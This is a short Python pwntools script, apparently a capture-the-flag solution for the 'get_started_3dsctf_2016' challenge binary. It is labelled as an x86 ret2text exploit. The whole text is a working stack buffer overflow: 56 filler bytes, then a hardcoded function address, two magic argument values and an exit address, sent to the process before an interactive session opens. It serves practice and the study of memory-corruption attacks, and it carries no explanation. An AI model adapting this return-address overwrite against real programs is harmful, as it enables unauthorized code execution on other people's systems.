#Made by fly_autumn
#x86 ret2text?
from pwn import *
p = process("./get_started_3dsctf_2016")
elf = ELF("./get_started_3dsctf_2016")
context(arch="i386",os="linux")

offset = 56
func_plt = 0x80489a0
func_quick_plt = 0x80489b8
arg1 = 0x308cd64f
arg2 = 0x195719d1
exit_plt = 0x804e6a0
payload = b"\x00" * offset + p32(func_plt) + p32(exit_plt) + p32(arg1) + p32(arg2)
p.sendline(payload)

p.interactive()
